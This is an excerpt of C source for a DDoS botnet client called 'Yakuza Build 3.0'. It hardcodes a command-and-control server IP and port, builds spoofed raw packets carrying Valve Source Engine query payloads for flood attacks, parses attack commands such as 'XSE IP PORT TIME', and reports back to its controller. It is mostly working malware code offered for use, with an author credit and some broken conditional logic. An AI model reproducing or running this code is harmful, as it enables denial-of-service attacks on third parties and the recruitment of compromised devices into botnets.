...
#define Version  "Yakuza Build 3.0"

//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------

unsigned char *commServer[] = { "89.44.9.153:7065" };  //replace the 0.0.0.0 with YOUR i repeat Y O U R  server ip retard
...
void Vox(unsigned char *ip, int port, int secs)
    {
    int std_packet1;
    int ehhehehe;
    srand(time(NULL));
...
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    ...
    vserand = rand() % 60;
    if(vserand < 20) {
     vse_payload = "\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f", &vse_payload_len;
    }
        else if(20 < vserand < 40) {
     vse_payload = "\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x72\x3f\x61\x3f\x6e\x3f\x64\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x72\x3f\x61\x3f\x6e\x3f\x64\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x72\x3f\x61\x3f\x6e\x3f\x64\x3f", &vse_payload_len;
    }
        else if(40 < vserand < 60) {
     vse_payload = "\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f", &vse_payload_len;
    }
...
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    ...
    if(vserand < 20) {
     ...
     vse_payload = "\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f\x3f\x76\x3f\x73\x3f\x65\x3f\x3f\x68\x3f\x65\x3f\x78\x3f", &vse_payload_len;//Bot made by: snoopy wyn.#8652 
    }
...
void processCmd(int argc, unsigned char *argv[]) {
        ...
        if(!strcmp(argv[0], "XSE")) { //!* XSE IP PORT TIME 32 1024 10
...
int main(int argc, unsigned char *argv[]) {
        ...
        while(1) {
				...
				sockprintf(mainCommSock, "[\e[96mYakuza\e[97m] Connected Arch: \e[96m%s \e[97m|| Type: %s]", getBuild(), getEndianness());
				UpdateNameSrvs();
				char commBuf[4096];
                int got = 0;
                int i = 0;
